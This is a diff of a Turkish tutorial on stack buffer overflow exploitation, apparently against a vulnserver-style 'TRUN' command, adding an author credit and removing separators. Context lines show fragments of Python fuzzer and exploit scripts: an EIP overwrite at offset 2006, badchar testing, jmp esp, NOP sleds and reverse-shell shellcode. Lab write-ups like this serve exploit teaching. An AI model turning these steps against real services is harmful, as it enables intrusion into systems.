@@ -13,7 +13,6 @@ Amaç, ilgili girdi noktasındaki memory limitini aşıp buffer'ı taşırmak. T
 Örnek fuzzer scripti:
 
 ```python
---------------------------------
 #!/usr/bin/python
 
 import socket
@@ -31,7 +30,6 @@ while len(karaktersiz) < 10000:
 	karaktersiz = "A" * i
 	i += 200
 	s.close()
---------------------------------
 ```
 
 
@@ -82,7 +80,6 @@ Yani; uygulamaya 2006 karakter uzunluğunda string gönderilme durumunda kırıl
 Belirlediğimiz offset değeri olan 2006 karakter uzunluğunda uygulamaya bir string göndereceğiz ve daha sonra 4 karakter uzunluğunda da farklı bir string göndereceğiz. 2006'dan sonraki gelen 4 karakter EIP register'ının yerine set edilecek.
 
 ```python
---------------------------------
 #!/usr/bin/python
 
 import socket
@@ -96,7 +93,6 @@ s.recv(1024)
 s.send('TRUN .' + karaktersiz)
 s.recv(1024)
 s.close()
---------------------------------
 ```
 
 Bu kod ile 2006 tane A karakteri sonrasında da 4 tane B karakteri uygulamaya gönderilecek. Bu şekilde hedef uygulamaya gönderildiğinde; EIP değeri eğer BBBB yani 42424242 oluyorsa işlem tamamlanmış olacaktır.
@@ -158,7 +154,6 @@ Badchars:
 
 
 ```python
---------------------------------
 #!/usr/bin/python
 
 import socket
@@ -191,7 +186,6 @@ s.recv(1024)
 s.send('TRUN .' + karaktersiz)
 s.recv(1024)
 s.close()
---------------------------------
 ```
 
 Yukarıdaki badchar'ları exploitimiz aracılığıyla hedef uygulamaya göndereceğiz ve nelerin eksik olduğunu kontrol edeceğiz.
@@ -201,7 +195,6 @@ Not: jmp esp register'ını artık script'imize ekliyoruz.
 Aslında execute edilmeyen ne kadar komut varsa onları tespit edeceğiz. Ve onları badchars olarak işaretleyeceğiz. Not: Tabi hiç badchars da olmayabilir. Bu durumda \x00 (nullbyte) badchar'dır. Null byte'ın arkasından gelen işlemler olmayacaktır bu sebeple \x00'ı çıkaracağız.
 
 Fuzzer scriptini çalıştırıp dönen register'larda ESP'ye sağ tıklayıp Follow in Dump diyoruz ve sol alt penceredeki adreslerde dump detaylarını görebiliriz. Hex Dump kısmını detaylıca kontrol edip (tek tek sayıp) sıralamayı bozan karakterler varsa onlar badchars'tır. (Örn; 46'dan sonra 47 gelmesi gerekirken başka birşey gelmişse o \x47 karakterini badchar olarak işaretlememiz gerekiyor)
-
 
 ### SHELLCODE ve REVERSE SHELL
 
@@ -243,7 +236,6 @@ unsigned char buf[] =
 Exploit'imizin son hali:
 
 ```python
---------------------------------
 #!/usr/bin/python
 
 import socket
@@ -286,7 +278,6 @@ s.recv(1024)
 s.send('TRUN .' + karaktersiz)
 s.recv(1024)
 s.close()
---------------------------------
 ```
 
 Not: Jmp esp register'ından sonra shellcode'a gelene kadar programın herhangi bir işlem yapmasını önlemek için No Operation (NOP ('\x90')) kodu eklemeliyiz. 4'ün katları yani minimum 16 olacak şekilde exploit kodlarımıza NOP eklemeliyiz. "İşlem yapma demektir". Bu komut, talimat akışında yer kaplayan ancak EIP kaydı hariç makine bağlamını etkilemeyen bir tek bayt'lık talimattır.
@@ -315,3 +306,6 @@ PWNED!!!
 
 C:\Users\ismail\Desktop\socketsrv>
 ```
+
+Bu döküman [İsmail SAYGILI](https://www.ismailsaygili.com.tr/p/kimdir_15.html) tarafından hazırlanmıştır.
+
